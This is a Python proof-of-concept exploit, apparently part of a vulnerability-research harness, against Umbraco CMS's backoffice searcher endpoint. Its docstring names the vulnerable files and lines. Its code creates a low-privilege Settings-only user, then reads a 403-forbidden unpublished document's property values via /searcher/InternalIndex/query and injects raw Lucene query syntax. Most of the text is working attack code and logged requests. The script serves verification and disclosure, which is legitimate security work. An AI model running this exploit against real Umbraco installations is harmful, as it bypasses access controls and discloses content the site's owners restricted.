#!/usr/bin/env python3
"""
VULN-007 — Lucene NativeQuery injection + cross-index content disclosure in the backoffice searcher

Vulnerable code (targets/Umbraco-CMS/src/Umbraco.Cms.Api.Management):
  * Controllers/Searcher/SearcherControllerBase.cs:13
        [Authorize(Policy = AuthorizationPolicies.SectionAccessSettings)]   <- SECTION floor only (Settings)
  * Controllers/Searcher/QuerySearcherController.cs:78-82
        only per-index carve-out = the MEMBER index (IMemberIndexAuthorizer); Internal/External NOT gated
  * Controllers/Searcher/QuerySearcherController.cs:84,110-113
        term = term?.Trim();  searcher.CreateQuery().NativeQuery(term).Execute(...)   <- RAW term -> Lucene classic QueryParser
  * Controllers/Searcher/QuerySearcherController.cs:135
        Fields = x.AllValues...    <- returns EVERY indexed field value per hit (incl. content/media property values)
  * contrast (safe): Umbraco.Examine.Lucene/BackOfficeExamineSearcher.cs escapes free text via QueryParserBase.Escape

Class: query-syntax injection + broken access control / cross-index disclosure (CWE-943, CWE-863).

Flaw (plain English):
  The whole searcher family is guarded ONLY by the Settings *section* policy, with a single carve-out for the
  member index. The Internal/External indexes hold every content and media node's property values (the Internal
  index also holds UNPUBLISHED/draft content). So a backoffice user who holds the Settings section but is
  explicitly DENIED the Content and Media sections — and has no start-node scope and no per-item
  ContentPermission — can read the full field values of any content/media node through
  GET /searcher/{name}/query, because the endpoint returns x.AllValues and never checks content/media authz.
  On top of that, `term` is handed to Examine's NativeQuery (Lucene's classic QueryParser) without escaping, so
  the user injects arbitrary Lucene query syntax (boolean/fielded/wildcard/fuzzy) — a genuine query-language
  injection, contrast the safe BackOfficeExamineSearcher which escapes free text.

Exploitation idea:
  Provision a Settings-ONLY user (no Content, no Media). Prove the boundary is real: GET /document/{secretDoc}
  via the normal, content-authorized endpoint returns 403. Then, as that same user, query the InternalIndex
  searcher and (a) read the secret document's `body` property value out of AllValues (disclosure), (b) send a
  raw boolean/fielded Lucene query that targets it (injection reaches the parser), and (c) send a malformed
  leading-wildcard term to trigger the Lucene ParseException path (proves the raw classic QueryParser parses
  attacker syntax). Also show the leaked doc is UNPUBLISHED: it is in InternalIndex but absent from ExternalIndex.

A successful run proves: a low-privilege, Content/Media-denied backoffice user reads the full property values of
a document it is 403-forbidden to read through the normal endpoint (incl. unpublished content) AND injects raw
Lucene query syntax — a cross-index content-disclosure + query-injection bypass.
"""
import json
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c

VID = "VULN-007"
INTERNAL = "InternalIndex"
EXTERNAL = "ExternalIndex"


def wait_until_indexed(admin, doc_name: str, secret: str, tries: int = 70, delay: float = 3.0) -> bool:
    """Poll the InternalIndex (targeted nodeName query) until the freshly-saved document's secret value is
    present in AllValues. Indexing is async (Examine indexes on save) and can lag under load. Reuse ONE
    token (valid ~20 min) — do NOT re-authenticate per iteration, or Umbraco's rapid-login lockout can trip."""
    for i in range(tries):
        r = admin.get(f"/searcher/{INTERNAL}/query", params={"term": f"nodeName:{doc_name}", "take": 10})
        if r.status_code == 200 and r.json().get("total", 0) >= 1 and secret in r.text:
            c.log("SETUP", f"content indexed after ~{int(i * delay)}s (InternalIndex returns the secret value)")
            return True
        time.sleep(delay)
    return False


def main() -> int:
    c.banner(VID, "Lucene NativeQuery injection + cross-index content disclosure via the searcher endpoint",
             "GET /searcher/{name}/query (QuerySearcherController.cs:110-113 raw NativeQuery, :135 AllValues; "
             "SearcherControllerBase.cs:13 = Settings section floor only)")

    # ---- SETUP (as admin): a document type + an UNPUBLISHED document holding a random secret ----
    admin = c.admin_client()
    c.log("SETUP", "admin authenticated to Management API")
    dt = c.create_doctype(admin)
    doc_name = f"secretdoc{c.rnd(3)}"                       # single lowercase token -> clean Lucene term
    secret = f"topsecretval{c.rnd(6)}"                      # random each run -> we assert THIS run's value
    doc_id = c.create_document(admin, dt["id"], doc_name, dt["propAlias"], secret)
    c.log("SETUP", f"created UNPUBLISHED document {doc_id}  name={doc_name!r}  body(secret)={secret!r}")
    if not wait_until_indexed(admin, doc_name, secret):
        c.log("FAIL", "document did not appear in the InternalIndex within the retry budget")
        return c.verdict(VID, "NEEDS_MANUAL", "content indexing did not complete in time")

    # ---- provision a SETTINGS-ONLY user (has Settings; denied Content + Media; no start node) ----
    gid = c.create_group_with_start_node(admin, ["Umb.Section.Settings"], has_doc_root=False)
    pw = f"Settings_{c.rnd(6)}!aA1"
    u = c.create_user(admin, [gid])
    c.set_password_for_user(admin, u["id"], pw)
    c.log("SETUP", f"created Settings-ONLY user {u['email']} (Settings section; NO Content, NO Media)")

    low = c.ApiClient(u["email"], pw, label="settings-only")   # fresh, short-lived token; act immediately
    cur = low.get("/user/current").json()
    sections = list(cur.get("allowedSections", []))
    has_content = any("content" in s.lower() for s in sections)
    has_media = any("media" in s.lower() for s in sections)
    has_settings = any("settings" in s.lower() for s in sections)
    c.log("STEP", f"low-priv allowedSections={sections}  (content={has_content}, media={has_media}, settings={has_settings})")

    ok = True
    if has_content or has_media or not has_settings:
        c.log("FAIL", "provisioned user is not Settings-only; cannot establish the privilege boundary")
        ok = False

    # ---- CONTRAST: the normal, content-authorized endpoint refuses this user ----
    c.log("STEP", f"baseline: GET /document/{doc_id} via the normal content endpoint (needs the Content section)")
    r_norm = low.get(f"/document/{doc_id}")
    if r_norm.status_code == 403:
        c.log("PROOF", "GET /document/{secretDoc} -> 403 Forbidden — the user genuinely cannot read content here")
    else:
        c.log("INFO", f"GET /document/{{secretDoc}} -> {r_norm.status_code} (expected 403; user has no Content section)")

    # ---- ATTACK 1 (disclosure): read the secret document's property value out of AllValues ----
    c.log("STEP", f"attack: GET /searcher/{INTERNAL}/query?term=nodeName:{doc_name}  (as the Settings-only user)")
    r_leak = low.get(f"/searcher/{INTERNAL}/query", params={"term": f"nodeName:{doc_name}", "take": 10})
    leaked_body = None
    if r_leak.status_code == 200 and secret in r_leak.text:
        items = r_leak.json().get("items", [])
        for it in items:
            fields = {f["name"]: f["values"] for f in it.get("fields", [])}
            if any(secret in str(v) for v in fields.values()):
                leaked_body = fields.get(dt["propAlias"])
                c.log("PROOF", f"searcher returned the forbidden document: id={it['id']}, "
                               f"__Key={fields.get('__Key')}, nodeName={fields.get('nodeName')}")
                c.log("PROOF", f"AllValues leaked the secret property value  body={leaked_body}  "
                               f"(+ path/creatorName/writerName/etc. — full field dump)")
                break
    if leaked_body is None:
        c.log("FAIL", f"searcher disclosure failed: status={r_leak.status_code} body={r_leak.text[:200]}")
        ok = False

    # ---- prove it is UNPUBLISHED content: present in InternalIndex, absent from ExternalIndex ----
    r_ext = low.get(f"/searcher/{EXTERNAL}/query", params={"term": f"nodeName:{doc_name}", "take": 10})
    ext_total = r_ext.json().get("total") if r_ext.status_code == 200 else "?"
    if r_ext.status_code == 200 and ext_total == 0:
        c.log("PROOF", f"ExternalIndex total=0 for the same node -> the leaked document is UNPUBLISHED/draft "
                       f"(only the InternalIndex holds it), yet it still leaked")

    # ---- ATTACK 2 (injection): raw boolean/fielded Lucene query reaches the classic parser ----
    inj = f"nodeName:{doc_name} AND __IndexType:content"
    r_inj = low.get(f"/searcher/{INTERNAL}/query", params={"term": inj, "take": 10})
    inj_total = r_inj.json().get("total") if r_inj.status_code == 200 else "?"
    if r_inj.status_code == 200 and isinstance(inj_total, int) and inj_total >= 1:
        c.log("PROOF", f"raw Lucene boolean/fielded query {inj!r} parsed and matched (total={inj_total}) "
                       f"— attacker query syntax reaches NativeQuery unescaped")
    else:
        c.log("INFO", f"boolean-query result status={r_inj.status_code} total={inj_total}")

    # malformed leading-wildcard term -> Lucene ParseException path (QuerySearcherController.cs:115-126)
    r_bad = low.get(f"/searcher/{INTERNAL}/query", params={"term": "*abc"})
    if r_bad.status_code in (400, 404) and "parse" in r_bad.text.lower():
        c.log("PROOF", f"malformed leading-wildcard term '*abc' -> HTTP {r_bad.status_code} 'Could not parse the query' "
                       f"— the raw term is fed to Lucene's classic QueryParser (NativeQuery injection, not escaped)")
    else:
        c.log("INFO", f"malformed-term result status={r_bad.status_code} body={r_bad.text[:120]}")

    # ---- persist decisive request/response ----
    here = os.path.dirname(__file__)
    with open(os.path.join(here, "request.http"), "w") as f:
        f.write("# All requests sent as the SETTINGS-ONLY user (no Content, no Media section)\n\n"
                f"# contrast — normal content endpoint refuses this user:\n"
                f"GET {c.MGMT}/document/{doc_id} HTTP/1.1\nAuthorization: Bearer <settings-only-token>\n\n"
                f"# disclosure — read the forbidden document's property values out of AllValues:\n"
                f"GET {c.MGMT}/searcher/{INTERNAL}/query?term=nodeName:{doc_name}&take=10 HTTP/1.1\n"
                f"Authorization: Bearer <settings-only-token>\n\n"
                f"# injection — raw boolean/fielded Lucene syntax reaches the classic QueryParser:\n"
                f"GET {c.MGMT}/searcher/{INTERNAL}/query?term=nodeName:{doc_name}%20AND%20__IndexType:content HTTP/1.1\n"
                f"Authorization: Bearer <settings-only-token>\n\n"
                f"# malformed term -> Lucene ParseException path:\n"
                f"GET {c.MGMT}/searcher/{INTERNAL}/query?term=*abc HTTP/1.1\n"
                f"Authorization: Bearer <settings-only-token>\n")
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"secret injected this run: {secret}\n")
        f.write(f"low-priv allowedSections: {sections}\n\n")
        f.write(f"GET /document/{doc_id}                      -> {r_norm.status_code} (normal content endpoint)\n")
        f.write(f"GET /searcher/{INTERNAL}/query?term=nodeName:{doc_name}  -> {r_leak.status_code}\n")
        f.write(f"    leaked body property value              -> {json.dumps(leaked_body)}\n")
        f.write(f"GET /searcher/{EXTERNAL}/query (same node)  -> {r_ext.status_code}, total={ext_total}  (unpublished => 0)\n")
        f.write(f"GET /searcher/{INTERNAL}/query?term={inj}   -> {r_inj.status_code}, total={inj_total}\n")
        f.write(f"GET /searcher/{INTERNAL}/query?term=*abc    -> {r_bad.status_code} {r_bad.text[:160]}\n")

    if ok and leaked_body is not None:
        return c.verdict(VID, "CONFIRMED",
                         "Settings-only user (no Content/Media) read a 403-forbidden document's property values "
                         "via /searcher and injected raw Lucene syntax")
    return c.verdict(VID, "FAILED", "could not reproduce the searcher disclosure/injection")


if __name__ == "__main__":
    sys.exit(main())
